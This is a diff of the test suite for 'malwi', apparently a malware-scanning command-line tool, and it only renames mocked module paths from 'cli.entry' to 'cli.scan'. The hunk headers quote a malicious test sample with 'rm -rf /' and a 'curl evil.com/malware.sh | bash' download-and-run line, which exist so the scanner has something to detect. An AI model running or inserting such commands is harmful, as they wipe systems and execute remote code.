@@ -25,8 +25,8 @@ class TestBasicCLI:
         test_file.write_text("print('hello world')")
 
         # Mock the models to avoid loading actual ML models
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 # Create a mock report
                 from common.malwi_object import MalwiReport, MalwiObject
 
@@ -56,7 +56,7 @@ class TestBasicCLI:
                 with patch.object(
                     sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                 ):
-                    with patch("cli.entry.result") as mock_result:
+                    with patch("cli.scan.result") as mock_result:
                         main()
 
                         # Verify MalwiReport.create was called correctly
@@ -86,8 +86,8 @@ subprocess.call(['rm', '-rf', '/'])
 os.system('curl evil.com/malware.sh | bash')
 """)
 
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 # Create mock malicious object
@@ -118,7 +118,7 @@ os.system('curl evil.com/malware.sh | bash')
                 with patch.object(
                     sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                 ):
-                    with patch("cli.entry.result") as mock_result:
+                    with patch("cli.scan.result") as mock_result:
                         main()
 
                         # Verify result shows malicious detection
@@ -134,8 +134,8 @@ os.system('curl evil.com/malware.sh | bash')
         formats_to_test = ["demo", "json", "yaml", "markdown"]
 
         for fmt in formats_to_test:
-            with patch("cli.entry.MalwiObject.load_models_into_memory"):
-                with patch("cli.entry.MalwiReport.create") as mock_process:
+            with patch("cli.scan.MalwiObject.load_models_into_memory"):
+                with patch("cli.scan.MalwiReport.create") as mock_process:
                     from common.malwi_object import MalwiReport, MalwiObject
 
                     mock_obj = MalwiObject(
@@ -177,7 +177,7 @@ os.system('curl evil.com/malware.sh | bash')
                         "argv",
                         ["malwi", "scan", str(test_file), "--format", fmt, "--quiet"],
                     ):
-                        with patch("cli.entry.result") as mock_result:
+                        with patch("cli.scan.result") as mock_result:
                             main()
 
                             # Verify the correct format method was used
@@ -197,8 +197,8 @@ os.system('curl evil.com/malware.sh | bash')
         test_file.write_text("print('save test')")
         output_file = tmp_path / "output.json"
 
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
@@ -239,7 +239,7 @@ os.system('curl evil.com/malware.sh | bash')
                         "--quiet",
                     ],
                 ):
-                    with patch("cli.entry.info") as mock_info:
+                    with patch("cli.scan.info") as mock_info:
                         main()
 
                         # Verify file was saved
@@ -257,8 +257,8 @@ os.system('curl evil.com/malware.sh | bash')
         (tmp_path / "file3.js").write_text("console.log('file3')")
         (tmp_path / "readme.txt").write_text("This is a readme")  # Should be skipped
 
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 # Mock objects for each processed file
@@ -299,7 +299,7 @@ os.system('curl evil.com/malware.sh | bash')
                 with patch.object(
                     sys, "argv", ["malwi", "scan", str(tmp_path), "--quiet"]
                 ):
-                    with patch("cli.entry.result") as mock_result:
+                    with patch("cli.scan.result") as mock_result:
                         main()
 
                         # Verify directory processing
@@ -322,8 +322,8 @@ os.system('curl evil.com/malware.sh | bash')
         test_file = tmp_path / "test.py"
         test_file.write_text("import subprocess")
 
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
@@ -356,7 +356,7 @@ os.system('curl evil.com/malware.sh | bash')
                     "argv",
                     ["malwi", "scan", str(test_file), "--threshold", "0.9", "--quiet"],
                 ):
-                    with patch("cli.entry.result") as mock_result:
+                    with patch("cli.scan.result") as mock_result:
                         main()
 
                         # Verify custom threshold was used
@@ -380,8 +380,8 @@ os.system('curl evil.com/malware.sh | bash')
         (tmp_path / "test.pyw").write_text("print('python windows')")
         (tmp_path / "test.js").write_text("console.log('js')")
 
-        with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+        with patch("cli.scan.MalwiObject.load_models_into_memory"):
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 mock_report = MalwiReport(
@@ -413,7 +413,7 @@ os.system('curl evil.com/malware.sh | bash')
                         "--quiet",
                     ],
                 ):
-                    with patch("cli.entry.result"):
+                    with patch("cli.scan.result"):
                         main()
 
                         # Verify custom extensions were used
@@ -433,10 +433,10 @@ os.system('curl evil.com/malware.sh | bash')
 
         # Make model loading fail
         with patch(
-            "cli.entry.MalwiObject.load_models_into_memory",
+            "cli.scan.MalwiObject.load_models_into_memory",
             side_effect=Exception("Model loading failed"),
         ):
-            with patch("cli.entry.MalwiReport.create") as mock_process:
+            with patch("cli.scan.MalwiReport.create") as mock_process:
                 from common.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
@@ -465,7 +465,7 @@ os.system('curl evil.com/malware.sh | bash')
                 with patch.object(
                     sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                 ):
-                    with patch("cli.entry.result") as mock_result:
+                    with patch("cli.scan.result") as mock_result:
                         # Should not crash
                         main()
 
